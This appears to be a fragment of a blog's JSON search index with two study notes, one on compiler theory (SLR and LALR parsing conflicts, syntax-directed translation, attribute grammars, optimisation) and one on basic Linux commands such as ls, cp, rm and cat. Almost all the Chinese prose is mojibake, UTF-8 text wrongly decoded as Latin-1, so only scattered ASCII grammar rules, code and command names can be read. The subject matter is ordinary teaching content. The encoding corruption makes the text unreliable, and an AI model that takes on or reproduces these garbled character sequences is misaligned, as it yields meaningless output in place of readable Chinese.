SLR(1)è§åˆ°Firsté›†å°±ç§»è¿›ï¼Œè§åˆ°ç»ˆæ€å…ˆçœ‹Followé›†ï¼Œä¸Followé›†å¯¹åº”çš„é¡¹ç›®å½’çº¦ï¼Œå…¶å®ƒæŠ¥é”™ã€‚ \u003e\u003e\u003eSLRåˆ†ææ³•åŒ…å«çš„å±•æœ›ä¿¡æ¯æ˜¯ä½“ç°åœ¨åˆ©ç”¨äº†Follow(A)ä¿¡æ¯ï¼Œå¯ä»¥è§£å†³â€œå½’çº¦ï¼å½’çº¦â€å†²çª SLRåˆ†ææ³•æ²¡æœ‰åŒ…å«è¶³å¤Ÿçš„å±•æœ›ä¿¡æ¯ï¼Œä¸èƒ½å®Œæˆè§£å†³â€œç§»è¿›ï¼å½’çº¦â€å†²çªï¼Œéœ€è¦æ”¹è¿›ã€‚ LALRåŒå¿ƒé›†åˆå¹¶ä¸ä¼šäº§ç”Ÿâ€œç§»è¿›ï¼å½’çº¦â€å†²çª ï¼Œä½†ä¼šäº§ç”Ÿâ€œå½’çº¦ï¼å½’çº¦â€å†²çª LR(1)   è¯­æ³•åˆ¶å¯¼çš„ç¿»è¯‘ï¼ˆSyntax-Directed Translationï¼‰ ä¸€ç§è¯­ä¹‰æè¿°æ–¹æ³•ï¼šè¯­æ³•åˆ¶å¯¼çš„ç¿»è¯‘\nè¯­æ³•åˆ¶å¯¼ç¿»è¯‘é‡‡ç”¨ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•æ¥å¼•å¯¼å¯¹è¯­è¨€çš„ç¿»è¯‘ï¼Œæ˜¯ä¸€ç§é¢å‘æ–‡æ³•çš„ç¿»è¯‘æŠ€æœ¯\nè¯­æ³•åˆ¶å¯¼ç¿»è¯‘=è¯­æ³•åˆ†æ+è¯­ä¹‰åˆ†æ+ä¸­é—´ä»£ç ç”Ÿæˆ\nè¯­ä¹‰ç¿»è¯‘ = è¯­ä¹‰åˆ†æ + ä¸­é—´ä»£ç ç”Ÿæˆ\nå±æ€§æ–‡æ³• å¦‚ä½•è¡¨ç¤ºè¯­ä¹‰ä¿¡æ¯ï¼Ÿä¸ºæ–‡æ³•ç¬¦å·è®¾ç½®è¯­ä¹‰å±æ€§ï¼Œç”¨æ¥è¡¨ç¤ºè¯­æ³•æˆåˆ†å¯¹åº”çš„è¯­ä¹‰ä¿¡æ¯ã€‚\nè¯­æ³•åˆ¶å¯¼å®šä¹‰ï¼šæ˜¯å¯¹ä¸Šä¸‹æ–‡æ— å…³æ–‡æ³•çš„æ¨å¹¿ï¼Œå°†æ¯ä¸ªæ–‡æ³•ç¬¦å·å’Œä¸€ä¸ªè¯­ä¹‰å±æ€§é›†åˆç›¸å…³è”ï¼Œå°†æ¯ä¸ªäº§ç”Ÿå¼å’Œä¸€ç»„è¯­ä¹‰è§„åˆ™ç›¸å…³è”ï¼Œè¿™äº›ç”¨äºè®¡ç®—è¯¥äº§ç”Ÿå¼ä¸­å„æ–‡æ³•ç¬¦å·çš„å±æ€§å€¼\nå±æ€§æ–‡æ³•å®šä¹‰çš„å½¢å¼   åŸºç¡€æ–‡æ³•\n  æ¯ä¸ªæ–‡æ³•ç¬¦å·æœ‰ä¸€ç»„å±æ€§\n  æ¯ä¸ªæ–‡æ³•äº§ç”Ÿå¼ A â¡ Î±  æœ‰ä¸€ç»„å½¢å¼ä¸º b := f(c1,c2,â€¦â€¦,ck) çš„è¯­ä¹‰è§„åˆ™ï¼Œå…¶ä¸­ f æ˜¯å‡½æ•°ï¼Œbå’Œc1,c2,â€¦â€¦,ckæ˜¯è¯¥äº§ç”Ÿå¼æ–‡æ³•ç¬¦å·çš„å±æ€§\n   ç»¼åˆå±æ€§ï¼šå¦‚æœbæ˜¯Açš„å±æ€§ï¼Œc1,c2â€¦â€¦,ckæ˜¯äº§ç”Ÿå¼å³éƒ¨æ–‡æ³•ç¬¦å·çš„å±æ€§æˆ–Açš„å…¶ä»–å±æ€§\n  ç»§æ‰¿å±æ€§ï¼šå¦‚æœbæ˜¯äº§ç”Ÿå¼å³éƒ¨æŸä¸ªæ–‡æ³•ç¬¦å·Xçš„å±æ€§\n     æ–‡æ³•ç¬¦å·çš„å±æ€§åˆ†ä¸ºï¼šç»¼åˆå±æ€§å’Œç»§æ‰¿å±æ€§ã€‚\nç»¼åˆå±æ€§ï¼ˆSynthesized Attributeï¼‰ Så±æ€§å®šä¹‰ï¼šä»…ä»…ä½¿ç”¨ç»¼åˆå±æ€§çš„è¯­æ³•åˆ¶å¯¼å®šä¹‰\nä¾‹ï¼š\nè¯­æ³•åˆ†ææ ‘å¦‚ä¸‹\nåˆ†ææ ‘çš„å„èŠ‚ç‚¹å±æ€§çš„è®¡ç®—è‡ªä¸‹è€Œä¸Šå®Œæˆ\nç»§æ‰¿å±æ€§ï¼ˆInherited Attributeï¼‰ ä¾‹ï¼šè¯­æ³•è§„åˆ™å¦‚ä¸‹ï¼š\nåˆ†ææ ‘å¦‚ä¸‹ï¼š\nåˆ†ææ ‘çš„ä¾èµ–å›¾å¦‚ä¸‹\nå…¶ä¸­ï¼ŒL â¡ L1 ï¼Œid ï¼› L1.in := L.inï¼›addtype(id.entry , L.in)ï¼›\nåŸºäºå±æ€§æ–‡æ³•çš„å¤„ç†æ–¹æ³• å±æ€§è®¡ç®—æ¬¡åº æ‹“æ‰‘æ’åºï¼šèŠ‚ç‚¹çš„ä¸€ç§é¡ºåºï¼Œæ˜¯çš„è¾¹åªä¼šä»è¯¥æ¬¡åºä¸­å…ˆå‡ºç°çš„èŠ‚ç‚¹åˆ°åå‡ºç°çš„èŠ‚ç‚¹\nâ‘ æ„é€ è¾“å…¥çš„åˆ†ææ ‘ï¼Œâ‘¡æ„é€ å±æ€§ä¾èµ–å›¾ï¼Œâ‘¢å¯¹èŠ‚ç‚¹è¿›è¡Œæ‹“æ‰‘æ’åºï¼Œâ‘£æŒ‰æ‹“æ‰‘æ’åºçš„æ¬¡åºè®¡ç®—å±æ€§ã€‚\nå½“ç„¶ï¼Œä¹Ÿå¯ä»¥å¤šæ¬¡æ‰«æåˆ†ææ ‘ï¼Œå¦‚æœå±æ€§æ–‡æ³•ä¸å­˜åœ¨å¾ªç¯ä¾èµ–ï¼Œæ¯æ¬¡è‡³å°‘ä¼šè®¡ç®—å‡ºä¸€ä¸ªå±æ€§å€¼ï¼Œä½†æ˜¯ç¼–è¯‘æ›´åå‘äºä¸€è¾¹æ‰«æçš„å¤„ç†æ–¹æ³•ã€‚\næŠ½è±¡è¯­æ³•æ ‘   è¯­æ³•åˆ†æä¸è¯­ä¹‰å¤„ç†é˜¶æ®µåˆ†ç¦»\n  è¯­æ³•åˆ†ææ ‘ä¸é€‚åˆè¯­ä¹‰å¤„ç†çš„å› ç´ ï¼š\n  æå–å…¬å…±å·¦å› å­ æ¶ˆé™¤å·¦é€’å½’ç­‰å¼•å…¥æ–°çš„äº§ç”Ÿå¼å’Œç¬¦å·ã€æ ‡ç‚¹ç­‰è¯­æ³•è¦ç´ ä¸å«ä»»ä½•è¯­ä¹‰ä¿¡æ¯     æŠ½è±¡è¯­æ³•æ ‘æ˜¯è¯­æ³•åˆ†æå’Œåç»­é˜¶æ®µçš„æ¥å£\n  Så±æ€§æ–‡æ³•çš„è‡ªä¸‹è€Œä¸Šçš„è®¡ç®— å°†LRåˆ†æå™¨å¢åŠ ä¸€ä¸ªåŸŸæ¥ä¿å­˜ç»¼åˆå±æ€§å€¼\nLå±æ€§æ–‡æ³•çš„è‡ªä¸Šè€Œä¸‹çš„è®¡ç®—  ---è¾¹åˆ†æè¾¹ç¿»è¯‘çš„æ–¹å¼èƒ½å¦ç”¨äºç»§æ‰¿å±æ€§\nå±æ€§çš„è®¡ç®—æ¬¡åºä¸€å®šå—åˆ†ææ–¹æ³•æ‰€é™å®šçš„åˆ†ææ ‘ç»“ç‚¹å»ºç«‹æ¬¡åºçš„é™åˆ¶\nåˆ†ææ ‘çš„èŠ‚ç‚¹æ˜¯è‡ªå·¦å‘å³ç”Ÿæˆ\nå¦‚æœå±æ€§ä¿¡æ¯æ˜¯è‡ªå·¦å‘å³æµåŠ¨ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½åœ¨åˆ†æçš„åŒæ—¶å®Œæˆå±æ€§è®¡ç®—ã€‚\n Lå±æ€§çš„å®šä¹‰ å¦‚æœæ¯ä¸ªäº§ç”Ÿå¼ A â¡ X1X2â€¦Xn çš„æ¯æ¡è¯­ä¹‰è§„åˆ™è®¡ç®—çš„å±æ€§æ˜¯Açš„ç»¼åˆå±æ€§ï¼›æˆ–è€…Xj (1â‰¤jâ‰¤n)çš„ç»§æ‰¿å±æ€§ï¼Œä½†ä»–ä»…ä¾èµ–â‘ è¯¥äº§ç”Ÿå¼ä¸­Xj å·¦è¾¹ç¬¦å· X1X2â€¦Xj-1 çš„å±æ€§ï¼›â‘¡Açš„ç»§æ‰¿å±æ€§\nå˜é‡ç±»å‹å£°æ˜çš„è¯­æ³•åˆ¶å¯¼å®šä¹‰æ˜¯ä¸€ä¸ªLå±æ€§å®šä¹‰\nç¿»è¯‘æ–¹æ¡ˆï¼Œä¾‹ï¼šæŠŠæœ‰åŠ å‡çš„ä¸­ç¼€è¡¨è¾¾å¼ç¿»è¯‘æˆåç¼€è¡¨è¾¾å¼ï¼Œå¦‚æœæ˜¯8+5-2ï¼Œåˆ™è¾“å‡º8 5 + 2 - \nE â¡ T R R â¡ addop T {print(addop.lexeme)} R1 | Îµ T â¡ num {print(num.val)} å¦‚ 8+5-2å¯ç¿»è¯‘æˆ: E â‡’ T R â‡’ num {print (8)} R â‡’ num{print (8)}addop T{print (+)}R â‡’ num{print(8)}addop num{print(5)}{print (+)}R â€¦ {print(8)}{print(5)}{print(+)}addop T{print(-)} R â€¦ {print(8)}{print(5)}{print(+)}{print(2)}{print(-)} é¢„æµ‹ç¿»è¯‘å™¨çš„è®¾è®¡ æŠŠé¢„æµ‹åˆ†æå™¨çš„æ„é€ æ–¹æ³•æ¨å¹¿åˆ°ç¿»è¯‘æ–¹æ¡ˆçš„å®ç°\nå¦‚:äº§ç”Ÿå¼R â¡ +TR | Îµ çš„åˆ†æè¿‡ç¨‹ procedure R; begin if lookahead = '+' then begin match ('+');T;R; end else begin /*Do nothing*/ end end è¯­ä¹‰è§„åˆ™çš„ä¸¤ç§æè¿°æ–¹æ³•ï¼šå±æ€§æ–‡æ³•å’Œç¿»è¯‘æ–¹æ¡ˆ\n Så±æ€§çš„è‡ªä¸‹è€Œä¸Šè®¡ç®—ï¼ˆè¾¹åˆ†æä¾¿è®¡ç®—ï¼‰ Lå±æ€§çš„è‡ªä¸Šè€Œä¸‹è®¡ç®—ï¼ˆè¾¹åˆ†æä¾¿è®¡ç®—ï¼‰ Lå±æ€§çš„è‡ªä¸‹è€Œä¸Šè®¡ç®—ï¼ˆè¾¹åˆ†æä¾¿è®¡ç®—ï¼‰  ä¸­é—´ä»£ç ç”Ÿæˆ ä»£ç ä¼˜åŒ– ä»£ç æ”¹è¿›å˜æ¢çš„åŸåˆ™\n  ï¼ˆ1ï¼‰ç­‰ä»·åŸåˆ™ã€‚ç»è¿‡ä¼˜åŒ–åä¸åº”æ”¹å˜ç¨‹åºè¿è¡Œçš„ç»“æœã€‚\n  ï¼ˆ2ï¼‰æœ‰æ•ˆåŸåˆ™ã€‚ä½¿ä¼˜åŒ–åæ‰€äº§ç”Ÿçš„ç›®æ ‡ä»£ç è¿è¡Œæ—¶é—´è¾ƒçŸ­ï¼Œå ç”¨çš„å­˜å‚¨ç©ºé—´è¾ƒå°ã€‚\n  ï¼ˆ3ï¼‰åˆç®—åŸåˆ™ã€‚åº”å°½å¯èƒ½ä»¥è¾ƒä½çš„ä»£ä»·å–å¾—è¾ƒå¥½çš„ä¼˜åŒ–æ•ˆæœã€‚\n  ä¼˜åŒ–ï¼šâ‘ å…¬å…±å­è¡¨è¾¾å¼åˆ é™¤â‘¡å¤å†™ä¼ æ’­â‘¢æ­»ä»£ç åˆ é™¤â‘£ä»£ç å¤–æâ‘¤å¼ºåº¦å‰Šå¼±å’Œå½’çº³å˜é‡åˆ é™¤\nåŸºæœ¬å—ï¼šè¿ç»­çš„è¯­å¥åºåˆ—ï¼Œæ§åˆ¶æµä»ä»–çš„å¼€å§‹è¿›å…¥ï¼Œå¹¶ä»ä»–çš„æœ«å°¾ç¦»å¼€\n","description":"","tags":["compilier","studyNote"],"title":"Compiler","uri":"/posts/compiler/"},{"categories":["linux"],"content":"Linux Study Note  å‚è€ƒï¼š\né»‘é©¬ç¨‹åºå‘˜-linuxä»å…¥é—¨åˆ°ç²¾é€š\n Linuxç³»ç»Ÿçš„æ–‡ä»¶ linuxä¸€åˆ‡çš†æ–‡ä»¶\næ–‡ä»¶æ“ä½œç§ç±»ï¼šåˆ›å»ºæ–‡ä»¶ã€ç¼–è¾‘æ–‡ä»¶ã€ä¿å­˜æ–‡ä»¶ã€å…³é—­æ–‡ä»¶ã€é‡å‘½åæ–‡ä»¶ã€åˆ é™¤æ–‡ä»¶ã€æ¢å¤æ–‡ä»¶\næ–‡ä»¶ç›®å½•ç»“æ„ Binï¼šå…¨ç§°binaryï¼Œå«ä¹‰æ˜¯äºŒè¿›åˆ¶ã€‚è¯¥ç›®å½•ä¸­å­˜å‚¨çš„éƒ½æ˜¯ä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ–‡ä»¶éƒ½æ˜¯å¯ä»¥è¢«è¿è¡Œçš„ã€‚\nDevï¼šè¯¥ç›®å½•ä¸­ä¸»è¦å­˜æ”¾çš„æ˜¯å¤–æ¥è®¾å¤‡ï¼Œä¾‹å¦‚ç›˜ã€å…¶ä»–çš„å…‰ç›˜ç­‰ã€‚åœ¨å…¶ä¸­çš„å¤–æ¥è®¾å¤‡æ˜¯ä¸èƒ½ç›´æ¥è¢«ä½¿ç”¨çš„ï¼Œéœ€è¦æŒ‚è½½ï¼ˆç±»ä¼¼windowsä¸‹çš„åˆ†é…ç›˜ç¬¦ã€‚\nEtcï¼šè¯¥ç›®å½•ä¸»è¦å­˜å‚¨ä¸€äº›é…ç½®æ–‡ä»¶ã€‚\nHomeï¼šè¡¨ç¤ºâ€œå®¶â€ï¼Œè¡¨ç¤ºé™¤äº†rootç”¨æˆ·ä»¥å¤–å…¶ä»–ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œç±»ä¼¼äºwindowsä¸‹çš„User/ç”¨æˆ·ç›®å½•ã€‚\nProcï¼šprocessï¼Œè¡¨ç¤ºè¿›ç¨‹ï¼Œè¯¥ç›®å½•ä¸­å­˜å‚¨çš„æ˜¯Linuxè¿è¡Œæ—¶å€™çš„è¿›ç¨‹ã€‚\nRootï¼šè¯¥ç›®å½•æ˜¯rootç”¨æˆ·è‡ªå·±çš„å®¶ç›®å½•ã€‚\nSbinï¼šå…¨ç§°super binaryï¼Œè¯¥ç›®å½•ä¹Ÿæ˜¯å­˜å‚¨ä¸€äº›å¯ä»¥è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯å¿…é¡»å¾—æœ‰superæƒé™çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œã€‚\nTmpï¼šè¡¨ç¤ºâ€œä¸´æ—¶â€çš„ï¼Œå½“ç³»ç»Ÿè¿è¡Œæ—¶å€™äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ä¼šåœ¨è¿™ä¸ªç›®å½•å­˜ç€ã€‚\nUsrï¼šå…¨ç§°æ˜¯User Software Resourceï¼Œæ³¨æ„ä¸æ˜¯userçš„ç¼©å†™ã€‚å­˜æ”¾çš„æ˜¯ç”¨æˆ·è‡ªå·±å®‰è£…çš„è½¯ä»¶ã€‚ç±»ä¼¼äºwindowsä¸‹çš„program filesã€‚\nVarï¼šå­˜æ”¾çš„ç¨‹åº/ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶çš„ç›®å½•ã€‚\nMntï¼šå½“å¤–æ¥è®¾å¤‡éœ€è¦æŒ‚è½½çš„æ—¶å€™ï¼Œå°±éœ€è¦æŒ‚è½½åˆ°mntç›®å½•ä¸‹ã€‚\nLinuxçš„åŸºæœ¬æŒ‡ä»¤ linuxæŒ‡ä»¤æŒ‡åœ¨linuxç»ˆç«¯ï¼ˆå‘½ä»¤è¡Œï¼‰ä¸­è¾“å…¥çš„å†…å®¹ã€‚\nä¸€ä¸ªå®Œæ•´çš„æŒ‡ä»¤çš„æ ‡å‡†æ ¼å¼ï¼šLinuxé€šç”¨çš„æ ¼å¼\n1  #æŒ‡ä»¤ä¸»ä½“ (ç©ºæ ¼) [é€‰é¡¹] (ç©ºæ ¼) [æ“ä½œå¯¹è±¡]   ä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åŒ…å«å¤šä¸ªé€‰é¡¹ï¼Œæ“ä½œå¯¹è±¡ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ªã€‚\n1.lsæŒ‡ä»¤ å«ä¹‰ï¼šlsï¼ˆlistï¼‰\nç”¨æ³•1ï¼š#ls å«ä¹‰ï¼šåˆ—å‡ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§°\nç”¨æ³•2ï¼š#ls\tè·¯å¾„ å«ä¹‰ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§°\nè·¯å¾„åˆ†ä¸ºç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„\nç”¨æ³•3ï¼š#ls\té€‰é¡¹\tè·¯å¾„ å«ä¹‰ï¼šåœ¨åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§°ï¼Œå¹¶ä»¥æŒ‡å®šçš„æ ¼å¼è¿›è¡Œæ˜¾ç¤ºã€‚\nå¸¸è§çš„è¯­æ³•ï¼š\n1 2  #ls -l è·¯å¾„ #ls -la è·¯å¾„   é€‰é¡¹è§£é‡Šï¼š\nâ€‹ -lï¼šè¡¨ç¤ºlistï¼Œè¡¨ç¤ºä»¥è¯¦ç»†åˆ—è¡¨çš„å½¢å¼è¿›è¡Œå±•ç¤º\nâ€‹ -aï¼šè¡¨ç¤ºallï¼Œæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ˆåŒ…å«äº†éšè—æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼‰\nä¸Šè¿°åˆ—è¡¨ä¸­çš„ç¬¬ä¸€åˆ—è¡¨ç¤ºæ–‡æ¡£ç±»å‹ï¼Œå…¶ä¸­ â€œ - â€ è¡¨ç¤ºæ”¹è¡Œå¯¹åº”çš„æ–‡æ¡£ç±»å‹ä¸ºæ–‡ä»¶ï¼Œâ€œ d â€ è¡¨ç¤ºæ–‡æ¡£ç±»å‹ä¸ºæ–‡ä»¶å¤¹ã€‚\nåœ¨Linuxä¸­ï¼Œéšè—æ–‡æ¡£ä¸€èˆ¬ä»¥ â€œ . â€ å¼€å¤´ã€‚\nç”¨æ³•4ï¼š#ls\t-lh\tè·¯å¾„ å«ä¹‰ï¼šåˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§°ï¼Œä»¥åˆ—è¡¨çš„å½¢å¼å¹¶ä¸”åœ¨æ˜¾ç¤ºæ–‡æ¡£å¤§å°çš„æ—¶å€™ä»¥å¯è¯»æ€§è¾ƒé«˜çš„å½¢å¼æ˜¾ç¤º\nlsåˆ—å‡ºçš„ç»“æœé¢œè‰²è¯´æ˜ï¼Œå…¶ä¸­è“è‰²çš„åç§°è¡¨ç¤ºæ–‡ä»¶å¤¹ï¼Œé»‘è‰²çš„è¡¨ç¤ºæ–‡ä»¶ï¼Œç»¿è‰²çš„å…¶æƒé™ä¸ºæ‹¥æœ‰æ‰€æœ‰æƒé™\n2.pwdæŒ‡ä»¤ ç”¨æ³•ï¼š#pwd\tï¼ˆprint working directoryï¼Œæ‰“å°å½“å‰å·¥ä½œç›®å½•ï¼‰\n3.cdæŒ‡ä»¤ å‘½ä»¤ï¼š#cd\tï¼ˆchange directoryï¼Œæ”¹å˜ç›®å½•ï¼‰\nä½œç”¨ï¼šç”¨äºåˆ‡æ¢å½“å‰çš„å·¥ä½œç›®å½•\nè¯­æ³•ï¼š#cd\tè·¯å¾„ P.S. åœ¨linuxä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šç¬¦å·~ï¼Œç”¨äºè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„å®¶ç›®å½•\n4.mkdiræŒ‡ä»¤ æŒ‡ä»¤ï¼šmkdir\tï¼ˆmake directoryï¼Œåˆ›å»ºç›®å½•ï¼‰\nè¯­æ³•1ï¼š#mkdir\tè·¯å¾„ è·¯å¾„ï¼Œå¯ä»¥æ˜¯æ–‡ä»¶å¤¹åç§°ä¹Ÿå¯ä»¥æ˜¯åŒ…å«åç§°çš„ä¸€ä¸ªå®Œæ•´è·¯å¾„\nå‡å¦‚æ˜¯æ–‡ä»¶å¤¹åç§°ï¼Œåˆ™åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºè¯¥æ–‡ä»¶å¤¹\nè¯­æ³•2ï¼š#mkdir\t-p\tè·¯å¾„ å«ä¹‰ï¼šå½“ä¸€æ¬¡æ€§åˆ›å»ºå¤šå±‚ä¸å­˜åœ¨çš„ç›®å½•çš„æ—¶å€™ï¼Œæ·»åŠ -på‚æ•°ï¼Œå¦åˆ™ä¼šæŠ¥é”™\nè¯­æ³•3ï¼š#mkdir\tè·¯å¾„1\tè·¯å¾„2\tè·¯å¾„3\t... è¡¨ç¤ºä¸€æ¬¡æ€§åˆ›å»ºå¤šä¸ªç›®å½•\n5.touchæŒ‡ä»¤ ä½œç”¨ï¼šåˆ›å»ºæ–‡ä»¶\nè¯­æ³•ï¼š#touch\tæ–‡ä»¶è·¯å¾„\nè·¯å¾„å¯ä»¥æ˜¯ç›´æ¥çš„æ–‡ä»¶åä¹Ÿå¯ä»¥æ˜¯è·¯å¾„\nä¸€æ¬¡æ€§åˆ›å»ºå¤šä¸ªæ–‡ä»¶\n6.cpæŒ‡ä»¤ æŒ‡ä»¤å«ä¹‰ï¼šcp\tï¼ˆcopyï¼Œå¤åˆ¶ï¼‰\nä½œç”¨ï¼šå¤åˆ¶æ–‡ä»¶/æ–‡ä»¶å¤¹åˆ°æŒ‡å®šä½ç½®\nè¯­æ³•ï¼š#cp\tè¢«å¤åˆ¶çš„æ–‡æ¡£è·¯å¾„\tæ–‡æ¡£è¢«å¤åˆ¶åˆ°çš„è·¯å¾„ ç®€å•æ¥è¯´å°±æ˜¯#cp\tæºåœ°å€\tç›®çš„åœ°å€\næ³¨æ„ï¼šLinuxåœ¨å¤åˆ¶è¿‡ç¨‹ä¸­æ˜¯å¯ä»¥é‡æ–°å¯¹æ–°ä½ç½®çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åçš„ï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯å¿…é¡»çš„éœ€è¦ï¼Œåˆ™å»ºè®®ä¿æŒå‰ååç§°ä¸€è‡´ã€‚\nå½“ä½¿ç”¨cpå‘½ä»¤è¿›è¡Œæ–‡ä»¶å¤¹å¤åˆ¶æ“ä½œçš„æ—¶å€™éœ€è¦æ·»åŠ é€‰é¡¹â€œ-râ€ï¼ˆ-rè¡¨ç¤ºé€’å½’å¤åˆ¶ï¼‰ï¼Œå¦åˆ™ç›®å½•å°†è¢«å¿½ç•¥\n7.mvæŒ‡ä»¤ æŒ‡ä»¤å«ä¹‰ï¼šmv\tï¼ˆmoveï¼Œç§»åŠ¨ï¼Œå‰ªåˆ‡ï¼‰\nä½œç”¨ï¼šç§»åŠ¨æ–‡æ¡£åˆ°æ–°çš„ä½ç½®\nè¯­æ³•ï¼š#mv\téœ€è¦ç§»åŠ¨çš„æ–‡ä»¶è·¯å¾„\téœ€è¦ä¿å­˜çš„ä½ç½®è·¯å¾„ æ³¨ï¼šåœ¨Linuxä¸­é‡å‘½åçš„å‘½ä»¤ä¹Ÿæ˜¯mvï¼Œè¯­æ³•å’Œç§»åŠ¨è¯­æ³•ä¸€æ ·ã€‚\n8.rmæŒ‡ä»¤ æŒ‡ä»¤å«ä¹‰ï¼šrm\tï¼ˆremoveï¼Œç§»é™¤ï¼Œåˆ é™¤ï¼‰\nè¯­æ³•ï¼š#rm\té€‰é¡¹\téœ€è¦ç§»é™¤çš„æ–‡ä»¶è·¯å¾„ é€‰é¡¹ï¼š\t-fï¼šforceï¼Œå¼ºåˆ¶åˆ é™¤ï¼Œä¸æç¤ºæ˜¯å¦åˆ é™¤\nâ€‹\t-rï¼šè¡¨ç¤ºé€’å½’\nåœ¨åˆ é™¤çš„æ—¶å€™å¦‚æœä¸å¸¦é€‰é¡¹ï¼Œä¼šæç¤ºæ˜¯å¦åˆ é™¤ï¼Œå¦‚æœéœ€è¦ç¡®è®¤åˆ™è¾“å…¥â€œy/yesâ€ï¼Œå¦åˆ™è¾“å…¥\næ³¨æ„ï¼šå¦‚æœåœ¨åˆ é™¤çš„æ—¶å€™ä¸æƒ³é¢‘ç¹çš„ç¡®è®¤ï¼Œåˆ™å¯ä»¥åœ¨æŒ‡ä»¤ä¸­æ·»åŠ é€‰é¡¹â€œ-fâ€ï¼Œè¡¨ç¤ºforceï¼ˆå¼ºåˆ¶ï¼‰ã€‚\nåˆ é™¤ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼š\næ³¨æ„ï¼šåˆ é™¤ä¸€ä¸ªç›®å½•çš„æ—¶å€™éœ€è¦åšé€’å½’åˆ é™¤ï¼Œå¹¶ä¸”ä¸€èˆ¬ä¹Ÿä¸éœ€è¦è¿›è¡Œåˆ é™¤ç¡®è®¤è¯¢é—®ï¼Œæ‰€ä»¥ç§»é™¤ç›®å½•çš„æ—¶å€™ä¸€èˆ¬éœ€è¦ä½¿ç”¨-rfé€‰é¡¹ã€‚\nåˆ é™¤å¤šä¸ªæ–‡ä»¶ï¼š\nåˆ é™¤ä¸€ä¸ªç›®å½•ä¸‹å…·æœ‰å…¬å…±ç‰¹æ€§çš„æ–‡ä»¶ï¼Œä¾‹å¦‚éƒ½ä»¥Linuxå¼€å¤´\nå…¶ä¸­***ç§°ä¹‹ä¸ºé€šé…ç¬¦ï¼Œæ„æ€è¡¨ç¤ºä»»æ„çš„å­—ç¬¦ï¼ŒLinux*ï¼Œåˆ™è¡¨ç¤ºåªè¦æ–‡ä»¶ä»¥Linuxå¼€å¤´ï¼Œåç»­å­—ç¬¦åˆ™ä¸ç®¡**ã€‚\n9.vimæŒ‡ä»¤ æŒ‡ä»¤ï¼švim\tï¼ˆVimæ˜¯ä¸€æ¬¾æ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå·ç§°ç¼–è¾‘å™¨ä¹‹ç¥ï¼‰\nè¯­æ³•ï¼š#vim\tæ–‡ä»¶è·¯å¾„ ä½œç”¨ï¼šå¯ä»¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸å­˜åœ¨æ—¶ï¼Œå¯ä»¥åˆ›å»ºè¯¥æ–‡ä»¶\nvimå…¶ä»–ç”¨æ³•å‚è€ƒæœ¬æ–‡åç»­ã€‚\n10.è¾“å‡ºé‡å®šå‘ ä¸€èˆ¬å‘½ä»¤çš„è¾“å‡ºéƒ½ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸­ï¼Œæœ‰äº›æ—¶å€™éœ€è¦å°†ä¸€äº›å‘½ä»¤çš„æ‰§è¡Œç»“æœæƒ³è¦ä¿å­˜åˆ°æ–‡ä»¶ä¸­è¿›è¡Œåç»­çš„åˆ†æ/ç»Ÿè®¡ï¼Œåˆ™è¿™æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°çš„è¾“å‡ºé‡å®šå‘æŠ€æœ¯ã€‚\n\u003eï¼šè¦†è¾“å‡ºï¼Œä¼šè¦†ç›–æ‰åŸå…ˆçš„æ–‡ä»¶å†…å®¹\n\u003e\u003eï¼šè¿½åŠ è¾“å‡ºï¼Œä¸ä¼šè¦†ç›–åŸå§‹æ–‡ä»¶å†…å®¹ï¼Œä¼šåœ¨åŸå§‹å†…å®¹æœ«å°¾ç»§ç»­æ·»åŠ \nè¯­æ³•ï¼š#æ­£å¸¸æ‰§è¡Œçš„æŒ‡ä»¤ \u003e / \u003e\u003eæ–‡ä»¶çš„è·¯å¾„ æ³¨æ„ï¼šæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æ–°å»º\n11.catæŒ‡ä»¤ ä½œç”¨1ï¼šcatæœ‰ç›´æ¥æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶çš„åŠŸèƒ½ã€‚\nè¯­æ³•1ï¼š#cat\tæ–‡ä»¶çš„è·¯å¾„ ä½œç”¨2ï¼šcatè¿˜å¯ä»¥å¯¹æ–‡ä»¶æƒŠé†’åˆå¹¶\nè¯­æ³•2ï¼š#cat\tå¾…åˆå¹¶çš„æ–‡ä»¶è·¯å¾„1\tå¾…åˆå¹¶çš„æ–‡ä»¶è·¯å¾„2\t...\tæ–‡ä»¶è·¯å¾„n\t\u003e\tåˆå¹¶ä¹‹åçš„æ–‡ä»¶è·¯å¾„ 12.dfæŒ‡ä»¤ ä½œç”¨ï¼šæŸ¥çœ‹ç£ç›˜ç©ºé—´\nè¯­æ³•ï¼š#df\t-h 